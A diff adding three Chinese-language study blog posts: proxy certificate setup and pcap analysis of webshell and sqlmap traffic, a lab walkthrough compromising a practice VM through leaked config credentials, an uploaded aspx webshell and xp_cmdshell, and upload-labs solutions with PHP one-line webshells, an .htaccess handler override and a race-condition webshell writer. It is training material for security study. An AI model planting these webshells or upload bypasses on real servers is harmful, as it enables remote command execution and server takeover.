@@ -262,6 +262,241 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Burp,Yakit导入证书，流量分析，四大webshell管理工具" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/13/Burp,Yakit%E5%AF%BC%E5%85%A5%E8%AF%81%E4%B9%A6%EF%BC%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%8C%E5%9B%9B%E5%A4%A7webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/" class="article-date">
+      <time datetime="2024-01-13T15:08:10.000Z" itemprop="datePublished">2024-01-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/13/Burp,Yakit%E5%AF%BC%E5%85%A5%E8%AF%81%E4%B9%A6%EF%BC%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%8C%E5%9B%9B%E5%A4%A7webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/">Burp,Yakit导入证书，流量分析，四大webshell管理工具</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Burp-Yakit导入证书"><a href="#Burp-Yakit导入证书" class="headerlink" title="Burp,Yakit导入证书"></a>Burp,Yakit导入证书</h2><h3 id="Burp导入证书"><a href="#Burp导入证书" class="headerlink" title="Burp导入证书"></a>Burp导入证书</h3><p>1.首先要把Burp Suite的CA证书下载到本地,让火狐浏览器开了127.0.0.1:8080代理才可以下载证书，也就是要让Burp Suite能抓到浏览器的http包的情况下，才能访问到 <a target="_blank" rel="noopener" href="https://burp/">https://burp</a>。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705069863974-8ec09d83-3a32-4c46-a4a8-d9fadccabfcc.png"><br>2.打开下图浏览器代理插件，新建情景模式，协议，服务器，端口按Burp中的修改，改成图中的样子。然后开启代理<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070095102-c765e123-484b-4637-a503-d024e8ba4c84.png" alt="image.png"><br>3.访问<a target="_blank" rel="noopener" href="https://burp/">https://burp</a>，下载证书<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070206807-f0a50752-7af9-463d-95e8-d424524c9531.png" alt="image.png"><br>4.在浏览器的设置中搜索证书<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070443107-59d1bf8c-2134-4e63-88cc-03504042fc23.png" alt="image.png"><br>5.导入CA证书，勾选两个信任。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070477835-b29c9c06-9021-44f6-9b89-40baf4bbbf20.png" alt="image.png"></p>
+<p>6.在火狐浏览器访问百度<a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com/</a>，观察Burp的历史记录，发现Burp可以抓到https的包了！<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070912042-ccb3161b-34ab-43c6-935e-7311b09fa22f.png" alt="image.png"></p>
+<h3 id="Yakit导入证书"><a href="#Yakit导入证书" class="headerlink" title="Yakit导入证书"></a>Yakit导入证书</h3><p>1.打开Yakit,先点高级配置，再点证书下载。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705071194211-7d936d80-4380-4564-aa64-f2eafca60a09.png" alt="image.png"><br>2.接下来的步骤与Burp的4~6步相同，不再赘述。</p>
+<h2 id="流量分析（考试题）"><a href="#流量分析（考试题）" class="headerlink" title="流量分析（考试题）"></a>流量分析（考试题）</h2><h3 id="流量走向图"><a href="#流量走向图" class="headerlink" title="流量走向图"></a>流量走向图</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705135344744-0cd6280f-b861-4be9-abd2-d56e5b5f1f7d.png" alt="image.png"><br>分析</p>
+<ul>
+<li><p>浏览器请求http的数据包，yakit的监听端口8083（可改），Burp的监听端口8080（可改）监听到数据包并抓取，流量从浏览器到Yakit和Burp，再到Clash，最终通过节点出去。</p>
+</li>
+<li><p>爬虫程序中的代理部分，和.exe文件的流量，通过Proxifier代理软件，转到Clash的节点出去。</p>
+</li>
+<li><p>Wireshark是一款网络协议分析工具，它主要工作在网络层及以上的层级。具体来说，Wireshark可以分析的数据包范围包括：</p>
+<p>网络层：如IPv4、IPv6等协议的数据包。<br>传输层：如TCP、UDP等协议的数据包。<br>数据链路层：如PPP、HDRC、ARP协议的数据包<br>应用层：如HTTP、HTTPS、FTP、SMTP、DNS等应用层协议的数据包。</p>
+</li>
+</ul>
+<h3 id="皮卡包分析"><a href="#皮卡包分析" class="headerlink" title="皮卡包分析"></a>皮卡包分析</h3><p>1.下载老师的114.pcapng（抓的蚁剑的包）。输入过滤命令：<code>(ip.src_host==192.168.2.114 or ip.dst_host==192.168.2.114) and http</code>，然后按下图操作<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705139779611-09f3f039-848b-4ea4-ab88-787628239a73.png" alt="Image.png"><br>2.红色部分代表发出，蓝色部分代表返回<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705139922607-827d778d-0d2c-45fb-a47c-df19826ccf4a.png" alt="image.png"></p>
+<ol start="3">
+<li>介绍了在线加密和解密网站  <a target="_blank" rel="noopener" href="https://icyberchef.com/">https://icyberchef.com/</a>   to Base64—加密   from—解密<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705140147540-4e5d3c69-f198-496f-afa8-ddc5bb9eeec3.png" alt="image.png"><br>4.把下图1过程左边的URL拖到下图的位置，把之前的全部红色部分复制到右上框，在另外一个网页访问 <a target="_blank" rel="noopener" href="https://icyberchef.com/">https://icyberchef.com/</a>   把2过程的from base64拖到下图位置，把红色部分的最后一行复制有上框，在右上框从第一个字符一个一个删，直至得到操作者的命令。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705140771975-a0d4bd05-fc94-4ffe-b859-18df2470525b.png" alt="image.png"></li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144032076-320423ef-c914-4b56-861d-368e825c7a3b.png" alt="Image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144055440-9e3ff96c-89f4-4485-a4d9-0caad0bb1ed2.png" alt="Image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144078009-92cbe922-5bbb-43f3-a952-3f94d6ef4c1a.png" alt="Image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144090689-fe9486c2-6b5b-444a-9d1c-161e89ee9637.png" alt="Image.png"><br>5.下载老师的db.pcapng（抓sqlmap的包）输入过滤命令：<code>(ip.src_host==192.168.2.70 or ip.dst_host==192.168.2.70) and http</code>，然后和之前的步骤一样，追踪流-——&gt;到解码网站解码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705142088054-8e3366dc-c8c8-435a-99f4-d7c2f055fff3.png" alt="image.png"><br>6.对上图的解码出的sql语句分析，获取第9个字符，判断他是否大于1，大于1则返回true,小于1则返回false，下图是比较第8行和第9行的不同。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705143564256-82f024d5-50db-407e-ad75-13cc5d64f04a.png" alt="image.png" style="zoom:67%;" /></p>
+<h2 id="四大webshell管理工具"><a href="#四大webshell管理工具" class="headerlink" title="四大webshell管理工具"></a>四大webshell管理工具</h2><p>蚁剑（AntSword）： 蚁剑是一款开源的WebShell客户端，支持多种编程语言和平台。其主要功能包括文件管理、数据库管理、虚拟终端等。蚁剑的特点是具有强大的插件系统，可以扩展其功能。此外，蚁剑的流量特征较为明显，容易被安全设备识别。<br>菜刀（Chopper）： 菜刀是一款经典的WebShell管理工具，具有文件管理、数据库管理、虚拟终端等功能。菜刀的流量特征较为明显，通常会被安全设备识别。菜刀的Webshell通常使用一句话木马，执行函数如@eval、@assert等。<br>哥斯拉（Godzilla）： 哥斯拉是一款功能强大的Webshell权限管理工具，支持多种类型的Shell，包括PHP、JSP、ASP等。哥斯拉的特点是全部类型的Shell都能绕过市面上的大部分静态查杀和流量WAF。此外，哥斯拉还具有流量加密功能，可以绕过大部分的流量检测。哥斯拉还自带插件，如冰蝎、蚁剑等，可以实现更多的功能。<br>冰蝎（Behinder）： 冰蝎是一款动态二进制加密的Webshell管理客户端，主要基于Java开发，因此可以跨平台使用。冰蝎的特点是客户端基于Java，兼容性较好。冰蝎的Webshell通常使用Base64加密，以避免被检测。其流量特征较为明显，容易被安全设备识别。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-攻破靶机3，xpcmd_shell提权" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/13/%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BA3%EF%BC%8Cxpcmd_shell%E6%8F%90%E6%9D%83/" class="article-date">
+      <time datetime="2024-01-13T14:56:32.000Z" itemprop="datePublished">2024-01-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/13/%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BA3%EF%BC%8Cxpcmd_shell%E6%8F%90%E6%9D%83/">攻破靶机3，xpcmd_shell提权</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>1.下载AttackMachine镜像，打开AttackMachine虚拟机。打开桌面的武器库中的Nmap-<br>Zenmap GUI，输入命令：<code>nmap -p- 192.168.2.197</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704977290982-e5929f1d-9650-4723-8fd5-e56977aaa9f5.png" alt="Image.png"></p>
+<h2 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h2><p>打开御剑后台扫描工具，在域名处输入http：&#x2F;&#x2F;192.168.2.197:27689&#x2F;  开始扫描<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704976906442-8b11f617-522d-42f1-b419-0a58f751e467.png" alt="image.png"></p>
+<h2 id="登录文件上传系统"><a href="#登录文件上传系统" class="headerlink" title="登录文件上传系统"></a>登录文件上传系统</h2><p>1.在武器库的浏览器访问192.168.2.197:27689<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704977914799-6d421459-3b37-42b8-ae5f-847697b8ff04.png" alt="image.png"><br>2.因为之前扫到了robots.txt文件，尝试打开另一个网页访问192.168.2.197&#x2F;robots.txt<br>发现有两个文件，但没有什么用<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704979906080-f51c2b58-3937-4d63-8778-81a6f70ba619.png#averageHue=%23efeeeb&clientId=u190a0499-6ac5-4&from=paste&height=374&id=u9ae5524b&originHeight=374&originWidth=340&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51702&status=done&style=none&taskId=u308c3760-a74b-40e8-8eb2-0f66fb5472d&title=&width=340" alt="image.png"><br>3.用kali来扫目录，输入命令<code>dirsearch -u http://192.1682.197:27689 -x 403</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704980928757-1dafd58e-ff5f-459a-86f7-190c183dbe37.png#averageHue=%23242a31&clientId=u190a0499-6ac5-4&from=paste&height=676&id=u3a7cf51e&originHeight=676&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=515870&status=done&style=none&taskId=ub6202cb0-398b-4cff-8261-85e3a896d64&title=&width=1139" alt="image.png"><br>发现config.js，config.js 是一个配置文件，它在各种应用程序中用于存储配置设置。这个文件通常包含了应用程序运行所必需的设置，如数据库连接信息、API密钥、服务端口、环境变量等。访问&#x2F;js&#x2F;config.js<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704982330794-b03af0a9-d474-45f6-85af-2a0191888e80.png#averageHue=%23f3f3f1&clientId=u2c49fb85-0133-4&from=paste&height=447&id=u299889d7&originHeight=447&originWidth=433&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84111&status=done&style=none&taskId=uf1843aa8-9f01-469d-a2fc-dfff892d722&title=&width=433" alt="image.png"><br>发现是一些编码，没有什么用。<br>4.访问default.aspx。发现还是登录页面<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704982665607-9fd2d9ca-61d3-428b-8fcf-2ec2bfda533f.png" alt="image.png"></p>
+<p>5.访问&#x2F;web.config.bak。发现弹出一个窗口。尝试保存config.bak文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704983417775-3d154fa3-9193-43ef-81c7-5eba48665d5d.png" alt="image.png"><br>6.用记事本打开config.bak文件，发现用户名：down   密码：downsql  把这两记录下来。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704983553394-f3946d8b-d940-4f9f-892a-3c1d1ec82982.png#averageHue=%23f8f8f8&clientId=uf8bf4b3a-fd32-4&from=paste&height=594&id=u31528798&originHeight=594&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=152762&status=done&style=none&taskId=ue715bec7-126a-4930-a39b-95ce9fb51d0&title=&width=835" alt="image.png"></p>
+<ol start="7">
+<li>然后尝试去登录文件上传系统，发现登不进去。然后我们去思考扫描出来的开放的1433端口，sqlserver数据库的默认端口号正是1433端口。我们尝试去连接sqlserver数据库。下图是常见数据库默认端口，必记。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705067630506-a0ee2a93-8901-4c02-a81e-b905d33055f6.png#averageHue=%23f7f6f5&clientId=u5c96cd8b-c7f3-4&from=paste&height=429&id=ud1409434&originHeight=429&originWidth=462&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31791&status=done&style=none&taskId=ue16a71bc-30ca-44ad-b247-c49e8586dfd&title=&width=462" alt="image.png"></li>
+</ol>
+<p>8.打开武器库的Navicat,连接sqlserver。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704984228374-7982d392-9482-4731-9f7b-9561d6f7ce22.png#averageHue=%23c1c1c1&clientId=uf8bf4b3a-fd32-4&from=paste&height=491&id=u72096783&originHeight=491&originWidth=430&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32210&status=done&style=none&taskId=ub9351f9e-bdd6-475a-8236-294a4d251c1&title=&width=430" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704984276624-4baab891-e3e4-4a38-9b4a-212766f72045.png" alt="image.png"><br>填写用户名：down   密码：downsql<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704985551106-513dedfd-e1f9-4681-b1a3-7b7668257598.png" alt="image.png"><br>9.找到用户列表userLists，发现admin和他的密码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704985895843-d5020136-6d97-4265-9afe-fe609608e5ab.png" alt="image.png"><br>10.然后去登录admin, 登陆成功，获得第一个key<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704986062311-131dce03-3c06-4c58-ad76-4708e40f490d.png" alt="image.png"></p>
+<h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>1.找到文件上传，翻到第三页，发现文件过长会被截取，因为这是一个aspx网站，所以我们要找一个aspx木马上传。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705061291701-b636fe2e-7d90-499a-920b-dc2162c70cb3.png" alt="image.png"><br>2.在武器库中找到aspx木马，找到名称为一句话木马的文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705061444832-018f1895-3e39-4db6-8654-dcdd3c88e368.png" alt="image.png"><br>3.因为这个木马文件拖不出来，右击它并用cmd打开，用python写web程序。输入命令<code>python -m Simple HttpServer 80</code> 运行这个命令后， Python 解释器将启动 SimpleHTTPServer 服务，并且默认会在当前工作目录下提供一个 HTTP 服务。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705061858380-40d2f8a5-32ac-4a6c-849b-2017e658daa2.png" alt="image.png"><br>4.在主机的浏览器访问AttackMachine虚拟机的ip地址，然后下载木马文件。并把这个文件重命名为123defgh.jpg<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705062398289-36c0a266-30a2-453a-b293-187cb0d8478d.png#averageHue=%23292e23&clientId=u6cc2c564-ed7c-4&from=paste&height=327&id=u932be3f4&originHeight=327&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=188467&status=done&style=none&taskId=u7e14266b-fa1f-44ee-91a3-aafbf20e2e1&title=&width=1176" alt="image.png"><br>5.上传木马成功。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705063261270-8742829a-9543-43dd-8b71-7528e1eb164e.png#averageHue=%23c9c7c5&clientId=u6cc2c564-ed7c-4&from=paste&height=335&id=udd0a066c&originHeight=335&originWidth=1103&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71505&status=done&style=none&taskId=u62b84920-4871-4bf9-a963-e5227c6a510&title=&width=1103" alt="image.png"></p>
+<h2 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h2><p>1..然后去找木马的路径，右击这个木马文件，复制链接到另一个网页，删木马名称的几个字母，一般让浏览器访问不到这个文件，它就会报错，显示木马的路径。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705063761816-435e7e19-7d96-4789-96ee-f4400bfa34d7.png" alt="image.png"><br>2.复制木马的路径到kali的蚁剑，密码为abcd,连接蚁剑。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705064321473-01ee06df-596d-421c-8b87-2d13720087da.png#averageHue=%23f7f7f7&clientId=u6cc2c564-ed7c-4&from=paste&height=431&id=uffa3d926&originHeight=431&originWidth=605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51718&status=done&style=none&taskId=ue5d57972-4254-46fc-9912-6e76d6afb9c&title=&width=605" alt="image.png"><br>3.在蚁剑的文件里找到了Kay2！<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705064651744-5108cc2a-6076-410e-9291-9089a54ebdd3.png" alt="image.png"></p>
+<h2 id="xpcmd-shell提权"><a href="#xpcmd-shell提权" class="headerlink" title="xpcmd_shell提权"></a>xpcmd_shell提权</h2><p>1.在config.bak文件里发现了新数据库：FileManage  新用户名sa，新密码cisp pte@sa   所以我们尝试去Navicat去连接并登录这个数据库（属于SQLserver数据库）。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705064836132-5159adbc-e4d5-41e3-ac22-bda4af23401c.png" alt="image.png"><br>2.新建查询，目的是使用命令，实现远程桌面连接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705065929566-f24e8c3b-1ef1-4f4f-858e-4faa98ed1f06.png" alt="image.png"><br>3.在主机的搜索框内输入rdp,以管理员身份运行   远程桌面连接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705066664850-12191b19-d7dc-4651-8827-47e2470b9e73.png" alt="image.png"><br>4.在新建的查询中改用户名和密码。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705067072995-e42e8bba-9cbb-40ef-b4c7-5d0213aac4c6.png" alt="f4c90cff3c9dceb6199c562e2629786.png"><br>5.重新去实现远程桌面连接，登陆靶机桌面成功，获得最后的key3</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705067046588-31a376a1-e334-4244-853c-e0efceddbeeb.png" alt="image.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+      <time datetime="2024-01-13T14:50:56.000Z" itemprop="datePublished">2024-01-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p> 文件上传漏洞是发生在有上传功能的应用中,如果应用程序对用户的上传文件没有控制或者存在缺陷,攻击者可以利用应用上传功能存在的缺陷，上传木马病毒等有危害的文件到服务器上面，控制服务器。<br> 文件上传漏洞产生的主要原因是:应用中存在上传功能,但是上传的文件没有经过严格的合法性检验或者检验函数存在缺陷，导致可以上传木马文件到服务器。文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果。  </p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704894978322-9705649c-8e54-4437-8c41-6cb7d714db3b.png" alt="ea2ba82593a538bf915fcb8f6cba4b9.png"></p>
+<h2 id="webshell的编写"><a href="#webshell的编写" class="headerlink" title="webshell的编写"></a>webshell的编写</h2><h3 id="webshell的含义"><a href="#webshell的含义" class="headerlink" title="webshell的含义"></a>webshell的含义</h3><p>webshell通常被称为匿名用户（入侵者）通过网站端口对网站服务器的某种程度上操作的权限。它大多以动态脚本的形式存在，因此也有人称之为网站的后门工具。</p>
+<h3 id="webshell的编写-1"><a href="#webshell的编写-1" class="headerlink" title="webshell的编写"></a>webshell的编写</h3><pre><code> 在vscode创建一个.php文件，编写木马程序。下面是一个简单的木马
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码接受一个名为a的GET参数，并使用@system函数执行该参数指定的命令。</p>
+<h2 id="upload-labs靶场闯关"><a href="#upload-labs靶场闯关" class="headerlink" title="upload-labs靶场闯关"></a>upload-labs靶场闯关</h2><h3 id="upload-labs靶场的介绍"><a href="#upload-labs靶场的介绍" class="headerlink" title="upload-labs靶场的介绍"></a>upload-labs靶场的介绍</h3><p>介绍：一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种 上传漏洞 的靶场。</p>
+<h3 id="第1关"><a href="#第1关" class="headerlink" title="第1关"></a>第1关</h3><p>1.下载upload-labs-master压缩包，将其解压到小皮的根目录下。<br>2.开启小皮的apache,关闭小皮的mysql<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802551645-625f68f1-e047-45f8-a008-3ffa16aa89a3.png" alt="image.png"><br>3.在主机vscode中编写木马程序命名为1.php，把1.php复制到虚拟机的桌面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.在小皮，打开网站，进入第一关，F12关掉js,然后上传1.php<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802715762-dd33b9a1-b878-414a-ac04-40871d625839.png" alt="image.png"><br>4.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;whoami  或<br>?a&#x3D;systeminfo  成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802817976-fcbb7a14-a01a-46aa-8069-26519f7a1a86.png" alt="Image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704804002540-11217491-42e3-4de3-8515-5d260452e39f.png#averageHue=%23d69e55&clientId=u4c785162-43a8-4&from=paste&height=360&id=uc02ca140&originHeight=360&originWidth=1714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96505&status=done&style=none&taskId=u4b4a561b-06db-45ea-86a4-a6fa7f0b36e&title=&width=1714" alt="Image.png"></p>
+<h3 id="第2关"><a href="#第2关" class="headerlink" title="第2关"></a>第2关</h3><p>1.查看代码，发现上传的文件必须是jpeg，png，gif类型<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803230670-66a5787f-bb88-4c39-b4ec-f0b48be2a989.png" alt="image.png"><br>2.上传1.php后，用Yakit抓包，改为手动劫持，把16行改为image&#x2F;jpeg，在点击自动放行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804217050-eb4f51d3-07c1-426c-a4cf-c42d1ed902c8.png" alt="image.png"><br>3.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;whoami  或<br>?a&#x3D;systeminfo<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803812463-2e4ab493-3285-4d85-8deb-e712e5acc30f.png" alt="image.png"></p>
+<h3 id="第3关"><a href="#第3关" class="headerlink" title="第3关"></a>第3关</h3><p>1.查看代码，发现后缀 .asp .aspx  .php .jsp 全被禁了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804713798-251c60c2-dbe0-4796-b666-f7a51d865dba.png" alt="image.png"><br>2.把木马1.php重命名为1.php5，在虚拟机浏览器访问192.168.2.197。<br>3.之后的步骤和第一关一样。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805201249-c6b22a0d-ae62-4083-9bb7-6e9151f45fe4.png" alt="Image.png"></p>
+<h3 id="第4关"><a href="#第4关" class="headerlink" title="第4关"></a>第4关</h3><p>1.在vscode创建并编写 .htaccess文件,.htaccess文件是Apache服务器的一个配置文件，它允许网站管理员在服务器配置文件（通常是httpd.conf）之外，为特定目录及其子目录设置独立的配置指令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;3.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php                    <span class="comment">//这个指令为匹配模式的文件设置处理器为PHP引擎。换句话说，它告诉Apache将名为“3.jpg”的文件作为PHP脚本处理，而不是静态图像文件。</span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>2.把  .htaccess 移到虚拟机桌面<br>3.再把木马重命名为3.jpg<br>4.先上传.htaccess文件，再上传3.jpg<br>5.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;dir  成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805779045-dc34595b-479d-48ef-95cb-797dbe16b62d.png" alt="Image.png"></p>
+<h3 id="第18关"><a href="#第18关" class="headerlink" title="第18关"></a>第18关</h3><p>1.查看代码，第18行服务器删除当前目录文件。原理是这样的：服务器删文件。<br>向服务器不断发送上传木马请求的包，不断发送访问木马的包，服务器删不过来，个别木马被上传。若服务器性能好，则木马不能上传成功。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704806934936-ab5b98d9-105e-47c5-86f0-df5259364d06.png" alt="image.png"><br>2.重新编写木马程序</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../p.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
